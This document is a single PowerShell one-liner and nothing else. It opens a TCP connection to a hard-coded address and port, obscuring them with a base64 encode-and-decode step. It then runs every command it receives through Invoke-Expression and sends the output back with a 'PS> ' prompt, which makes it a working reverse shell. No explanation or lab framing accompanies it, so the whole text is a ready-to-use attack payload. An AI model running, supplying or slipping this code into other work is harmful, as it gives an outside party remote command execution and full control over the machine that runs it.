$ip='172.18.124.20';$port=1234;$e=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ip));$p=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($port.ToString()));$t=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e));$pt=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p));$client=New-Object Net.Sockets.TcpClient($t,[int]$pt);$ns=$client.GetStream();$w=New-Object IO.StreamWriter($ns);$b=New-Object byte[] $client.ReceiveBufferSize;function wrt($x){$w.Write($x+'PS> ');$w.Flush()};wrt'';while(($r=$ns.Read($b,0,$b.Length))-gt 0){$cmd=([text.encoding]::UTF8).GetString($b,0,$r-1);$out=try{Invoke-Expression $cmd 2>&1|Out-String}catch{$_|Out-String};wrt($out)};$w.Close()
